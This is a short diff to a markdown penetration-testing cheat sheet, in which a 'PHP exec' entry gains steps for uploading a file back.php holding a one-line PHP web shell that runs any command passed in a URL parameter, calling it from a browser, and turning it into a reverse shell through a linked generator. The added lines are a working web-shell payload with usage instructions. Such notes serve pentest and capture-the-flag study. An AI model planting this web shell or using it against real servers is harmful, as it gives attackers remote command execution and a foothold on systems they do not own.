@@ -371,4 +371,9 @@ phpinfo()
 ls
 
 ## PHP exec
-- exec()
+- upload file/code back.php
+```
+<?php echo shell_exec($_GET['c']);?>
+```
+- In browser: http://$target//back.php?c=dir
+  - http://$target//back.php?c=[Create a shell from here](https://www.revshells.com/)
